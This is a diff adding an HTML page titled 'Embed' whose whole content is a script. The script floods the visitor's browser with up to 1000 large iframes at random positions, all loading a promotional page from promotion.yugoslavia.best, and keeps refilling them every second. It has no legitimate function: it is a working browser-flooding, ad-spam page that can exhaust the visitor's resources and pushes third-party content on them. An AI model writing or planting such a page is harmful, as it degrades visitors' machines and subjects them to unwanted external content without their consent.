@@ -1,0 +1,58 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Embed</title>
+</head>
+<body>
+    <script>
+        // Function to get a random position within the viewport
+        function getRandomPosition() {
+            var x = Math.floor(Math.random() * window.innerWidth);
+            var y = Math.floor(Math.random() * window.innerHeight);
+            return { x: x, y: y };
+        }
+
+        // Set a maximum number of iframes to be displayed
+        const maxIframes = 1000;
+
+        // Create a function to add an iframe
+        function addIframe() {
+            var position = getRandomPosition();
+            var iframe = document.createElement('iframe');
+            iframe.setAttribute('src', 'https://promotion.yugoslavia.best/embed.php');
+            iframe.classList.add('yugopromotion');
+            iframe.setAttribute('width', '1618');
+            iframe.setAttribute('height', '200');
+            iframe.style.position = 'absolute';
+            iframe.style.top = position.y + 'px';
+            iframe.style.left = position.x + 'px';
+            
+            // Add the iframe to the document body
+            document.body.appendChild(iframe);
+
+            // Remove the iframe after a certain time period to avoid flooding
+            setTimeout(() => {
+                document.body.removeChild(iframe);
+            }, 5000); // Remove iframe after 5 seconds
+        }
+
+        // Function to manage the number of iframes
+        function manageIframes() {
+            const currentIframes = document.querySelectorAll('iframe.yugopromotion').length;
+            if (currentIframes < maxIframes) {
+                addIframe();
+            }
+        }
+
+        // Create and position iframes at intervals to control the flood
+        setInterval(manageIframes, 1000); // Check every second to add a new iframe if necessary
+
+        // Initial call to create iframes
+        for (let i = 0; i < maxIframes; i++) {
+            manageIframes();
+        }
+    </script>
+</body>
+</html>
